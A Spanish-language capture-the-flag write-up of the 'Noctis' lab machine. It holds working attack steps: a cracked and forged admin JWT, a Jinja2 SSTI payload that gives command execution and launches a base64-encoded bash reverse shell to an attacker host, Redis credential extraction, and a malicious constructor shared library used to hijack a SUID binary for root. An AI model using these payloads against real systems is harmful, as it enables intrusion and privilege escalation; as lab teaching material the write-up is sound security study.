---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

# CTF Noctis Intermediate

# Contexto de la maquina
## Trayectoria Noctis

<figure><img src="../../.gitbook/assets/trayectoria_3021ebfca9.png" alt=""><figcaption></figcaption></figure>

## Descripción

**Noctis Pwn3d!** es una máquina Linux de dificultad **Intermediate** en la plataforma **Pwn3d!** (compatible con DockerLabs) que simula el portal y panel interno de **NOCTIS Systems**, una empresa de inteligencia orbital ficticia. La cadena de compromiso encadena siete técnicas distintas en cuatro usuarios, haciendo de esta una de las cadenas más completas de las que has documentado.

El punto de partida es un comentario HTML en la web principal que revela la passphrase `midnight` y la ruta de una imagen de la que hay que extraer un archivo oculto con `steghide`. Ese archivo apunta a un vhost interno (`admin.noctis`) con un panel JWT. La clave de firma del JWT se crackea con `jwt_tool` y resulta ser la misma passphrase `midnight`, permitiendo forjar un token de administrador y acceder al panel. Dentro del panel hay un chat con un motor de plantillas Jinja2 vulnerable a **SSTI**, que se explota para obtener una reverse shell como `www-data`. Desde el contenedor, una instancia de **Redis** local expone credenciales del usuario `nova` sin autenticación. Con acceso SSH como `nova`, la escalada final a `root` se consigue mediante **Shared Library Hijacking**: el binario SUID `/usr/bin/voidaudit` carga una librería dinámica (`libnoctsec.so`) almacenada en un directorio propiedad de `nova`, que podemos reemplazar por una versión maliciosa que ejecuta una shell de `root`.

**Objetivo**

- Extraer el archivo `hint.txt` oculto en `hero.jpg` con `steghide` usando la passphrase del comentario HTML.
- Crackear la clave JWT del panel `admin.noctis` y forjar un token de administrador.
- Explotar el SSTI Jinja2 del chat para obtener reverse shell como `www-data`.
- Extraer credenciales de Redis y acceder por SSH como `nova`.
- Reemplazar la librería dinámica de `voidaudit` por una maliciosa y escalar a `root`.

**Tipo de máquina**

- Plataforma: Pwn3d! / DockerLabs
- Sistema operativo: Linux (Ubuntu)
- Categoría principal: Web / Linux Privilege Escalation
- Componentes involucrados:
    - Passphrase oculta en comentario HTML del código fuente.
    - Esteganografía con `steghide` en imagen JPEG.
    - Vhost `admin.noctis` con panel JWT.
    - JWT HS256 crackeado con `jwt_tool` + forja de token admin.
    - SSTI Jinja2 en chat del panel de administración.
    - Redis local sin autenticación con credenciales de `nova`.
    - Binario SUID `voidaudit` con librería `.so` reemplazable.
## Análisis de vulnerabilidades

<figure><img src="../../.gitbook/assets/carta_Passphrase_expuesta_en_comenta_1793272517883.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Datos_de_acceso_al_vhost_inter_1793272518506.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_JWT_HS256_firmado_con_clave_d__1793272519103.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_SSTI_en_motor_de_plantillas_Ji_1793272519766.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Redis_local_sin_autenticaci_n__1793272520413.png" alt=""><figcaption></figcaption></figure>
<figure><img src="../../.gitbook/assets/carta_Shared_Library_Hijacking_en_bi_1793272521440.png" alt=""><figcaption></figcaption></figure>

## Instalación

Cuando obtenemos el `.zip` lo pasamos al entorno de trabajo y lo descomprimimos:

```shell
unzip noctis.zip
```

Montamos la máquina con el script de despliegue:

```shell
bash auto_mount.sh noctis.tar
```

Cuando terminemos le damos a `Ctrl+C` para eliminar el contenedor y no dejar archivos residuales.
# Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-14 19:34 +0200
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx
|_http-title: NOCTIS Systems — Orbital Intelligence
```

Dos puertos abiertos:

- **Puerto 22** → SSH (OpenSSH 9.6p1), que usaremos cuando obtengamos credenciales.
- **Puerto 80** → HTTP (nginx). Aloja el portal principal de NOCTIS Systems.
## Enumeración web y código fuente

<figure><img src="../../.gitbook/assets/vuln_Passphrase_expuesta_en_comenta_6ee9dc21.png" alt=""><figcaption></figcaption></figure>

Accedemos a la web principal:

```
URL = http://<IP>/
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20261014193921.png" alt=""><figcaption></figcaption></figure>

La página parece normal, pero inspeccionando el **código fuente** (`Ctrl+U`) encontramos un comentario HTML revelador al final del body:

```html
<!--
  ============================================================
  bundle: noctis-relic-4.7.x
  nota integración: el arte heredado de esta landing queda sellado en
  /static/img/hero.jpg; el digest se verifica con la clave del turno
  nocturno ("midnight"). el vhost del panel legacy no se publica en
  los DNS internos por decisión del SOC — se firma por aparte.
  ============================================================
-->
```

Dos piezas de información críticas: la passphrase **`midnight`** y la ruta de un archivo de imagen (`hero.jpg`). El comentario menciona que la passphrase se usa para verificar el archivo, lo que apunta directamente a esteganografía.
# Esteganografía

<figure><img src="../../.gitbook/assets/vuln_Datos_de_acceso_al_vhost_inter_25f9ef31.png" alt=""><figcaption></figcaption></figure>

## Extracción del hint.txt desde hero.jpg

Descargamos la imagen desde la URL indicada en el comentario y ejecutamos `steghide` con la passphrase encontrada. `steghide` es una herramienta que embebe y extrae archivos ocultos dentro de imágenes JPEG usando cifrado AES. La passphrase protege el contenido embebido:

```bash
steghide extract -sf hero.jpg -p midnight
```

Respuesta:

```
anotó los datos extraídos en "hint.txt".
```

```bash
cat hint.txt
```

Respuesta:

```
side-channel legacy activo
vhost de ops: admin.noctis
stack auth del panel: JWT HS256 (LEGADO)
la clave de firma se rota... o se crackea.
```

Tres hallazgos clave:

- El vhost interno es `admin.noctis` (no publicado en DNS).
- El panel usa JWT firmado con HS256.
- La pista indica que la clave de firma es crackeable por diccionario.
## Añadir el vhost al /etc/hosts

```bash
sudo nano /etc/hosts

# Añadimos:
<IP>          admin.noctis
```

Accedemos al vhost:

```
URL = http://admin.noctis/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20261014194607.png" alt=""><figcaption></figcaption></figure>

Al introducir cualquier credencial (`admin:admin`), el servidor nos devuelve un JWT de invitado. El payload decodificado muestra:

```json
{
  "user": "admin",
  "role": "guest",
  "tier": "legacy"
}
```

El rol es `guest`. Intentar falsificarlo con algoritmo `none` no funciona, así que crackeamos la clave de firma.
# Crackeo del JWT

<figure><img src="../../.gitbook/assets/vuln_JWT_HS256_firmado_con_clave_dé_2e9acaa5.png" alt=""><figcaption></figcaption></figure>

## Crackeo de la clave con jwt_tool

**jwt_tool** es una herramienta especializada en auditoría de tokens JWT. El flag `-C` activa el modo crackeo de clave HMAC por diccionario:

```bash
python3 jwt_tool.py '<TOKEN>' -C -d <WORDLIST>
```

Respuesta:

```
[+] midnight is the CORRECT key!
```

La clave de firma es `midnight`, la misma passphrase del comentario HTML. El creador de la máquina la reutilizó intencionalmente para vincular ambos pasos.
## Forja del token de administrador

Con la clave conocida generamos un nuevo JWT con `role: admin` usando PyJWT:

```bash
python3 - <<'EOF'
import jwt
print(jwt.encode({"user":"op-000","role":"admin","tier":"noc"},
                 "midnight", algorithm="HS256"))
EOF
```

Respuesta:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoib3AtMDAwIiwicm9sZSI6ImFkbWluIiwidGllciI6Im5vYyJ9.8KhYnzCgmubc7CG8p1bjzSWXoeQ2cBKetgKlkG65-_Y
```
# Escalate user www-data

<figure><img src="../../.gitbook/assets/vuln_SSTI_en_motor_de_plantillas_Ji_03debba4.png" alt=""><figcaption></figcaption></figure>

## Acceso al panel de administración

Añadimos el token en las DevTools (`F12`) → `Storage` → `Cookies`:

<figure><img src="../../.gitbook/assets/Pasted image 20261021180319.png" alt=""><figcaption></figcaption></figure>

Explorando el panel encontramos la sección de chat:

```
URL = http://admin.noctis/admin/chat
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20261021180651.png" alt=""><figcaption></figcaption></figure>
## Identificación y explotación del SSTI Jinja2

El chat procesa los mensajes en el servidor. Probamos el payload de detección de SSTI más básico: si el servidor devuelve `49` en lugar del texto literal `{{7*7}}`, está evaluando expresiones Jinja2:

<figure><img src="../../.gitbook/assets/Pasted image 20261021181216.png" alt=""><figcaption></figcaption></figure>

El servidor evalúa la expresión. SSTI confirmado. Escalamos a RCE usando la cadena de escape de Jinja2 a través del objeto `lipsum`, una variable global disponible en el contexto de Flask/Jinja2. Esta cadena navega desde `lipsum` hasta `__globals__` → `__builtins__` → `__import__("os")` para ejecutar comandos:

```bash
curl -s http://admin.noctis/admin/chat \
  -H "Authorization: Bearer <TOKEN>" \
  -H 'Content-Type: application/json' \
  -d '{"msg":"{{lipsum.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}"}'
```

Respuesta:

```json
{"reply":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

RCE confirmado. Lanzamos la reverse shell codificada en Base64:

```bash
nc -lvnp <PORT>
```

```bash
curl -s http://admin.noctis/admin/chat \
  -H "Authorization: Bearer <TOKEN>" \
  -H 'Content-Type: application/json' \
  -d "{\"msg\":\"{{lipsum.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUuMTM0Lzc3NzcgMD4mMQ== | base64 -d | bash').read()}}\"}"
```

Respuesta en el listener:

```
Connection received on 172.17.0.2 59210
www-data@403d449add52:/$ whoami
www-data
```

Sanitizamos la TTY.
## Sanitizacion shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows <ROWS> columns <COLUMNS>
```
# Escalate user nova

<figure><img src="../../.gitbook/assets/vuln_Redis_local_sin_autenticación__63ca3179.png" alt=""><figcaption></figcaption></figure>

## Descubrimiento de Redis local

```bash
ss -tuln
```

Respuesta:

```
tcp  LISTEN  127.0.0.1:6379   ← Redis
```

El puerto **6379** es el estándar de **Redis**, una base de datos clave-valor en memoria muy usada como caché. Está escuchando solo en localhost. Redis no requiere autenticación por defecto a menos que se configure `requirepass`.
## Extracción de credenciales de Redis

```bash
redis-cli -h 127.0.0.1 KEYS '*'
```

Respuesta:

```
1) "vault:gate:pin:cur"
2) "vault:creds:nova:main"
3) "audit:0xF1:journal"
...
```

Las claves con prefijo `vault:creds:` son las que más nos interesan:

```bash
redis-cli -h 127.0.0.1 GET vault:creds:nova:main
```

Respuesta:

```
"n0v4-xr-7734"
```

La clave contiene directamente la contraseña SSH del usuario `nova`.
## SSH (nova)

```bash
ssh nova@<IP>
# Contraseña: n0v4-xr-7734
```

Respuesta:

```
nova@403d449add52:~$ whoami
nova
```

Leemos la flag del usuario:

> user.txt

```
NOCTIS{cr0ss1ng_7h3_gr1d_4_1nt3rn4l_5t4t10n_2fbd3}
```
# Escalate Privileges

<figure><img src="../../.gitbook/assets/vuln_Shared_Library_Hijacking_en_bi_6ce5111a.png" alt=""><figcaption></figcaption></figure>

## Identificación del binario SUID vulnerable

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Entre los resultados estándar del sistema, hay uno personalizado que destaca:

```
1022470  20  -rwsr-xr-x  1  root  root  16424  Oct 13 16:31  /usr/bin/voidaudit
```
## Análisis de las dependencias del binario

Analizamos qué librerías dinámicas carga `voidaudit` en tiempo de ejecución con `ldd`. Las librerías dinámicas son archivos `.so` que el sistema carga en memoria cuando el proceso arranca, similar a las DLL en Windows:

```bash
ldd /usr/bin/voidaudit
```

Respuesta:

```
libnoctsec.so => /opt/noctis/lib/libnoctsec.so (0x00007f1c53dd7000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

La librería `libnoctsec.so` se carga desde `/opt/noctis/lib/`. Comprobamos los permisos:

```bash
ls -la /opt/noctis/lib/
```

Respuesta:

```
drwxr-xr-x 1 nova nova    26 Oct 13 16:31 .
-rw-r--r-- 1 nova nova 15648 Oct 13 16:31 libnoctsec.so
```

El directorio y la librería pertenecen a `nova`. Tenemos permisos de escritura. Esto es un **Shared Library Hijacking**: podemos reemplazar la librería legítima por una versión maliciosa que se ejecutará como `root` cuando `voidaudit` la cargue.
## Creación de la librería maliciosa

El ataque usa el atributo `__attribute__((constructor))` de GCC, que marca una función para que sea ejecutada automáticamente en el momento en que la librería es cargada por cualquier proceso, antes de que el `main()` del binario comience. Como `voidaudit` tiene SUID de `root`, cuando carga nuestra librería esa función se ejecuta ya con los privilegios de `root`:

> pwn.c

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void noctsec_boot(void) { }   // función dummy para evitar errores de símbolo ausente

__attribute__((constructor)) void pwn(void) {
    setresgid(0,0,0);   // GID real, efectivo y guardado → 0 (root)
    setresuid(0,0,0);   // UID real, efectivo y guardado → 0 (root)
    system("/bin/bash");
}
```

Compilamos con `gcc`. El flag `-shared` produce una librería dinámica `.so`, `-fPIC` genera código independiente de posición (obligatorio para librerías compartidas):

```bash
gcc -shared -fPIC -o /opt/noctis/lib/libnoctsec.so pwn.c
```
## Escalada a root

```bash
/usr/bin/voidaudit
```

Respuesta:

```
root@403d449add52:~# whoami
root
```

En el momento en que `voidaudit` carga la librería, el constructor se ejecuta como `root`, establece UIDs a `0` y lanza bash. Leemos la flag final:

> root.txt

```
NOCTIS{d4rk_v01d_0wn3d_8c4f2e}
```

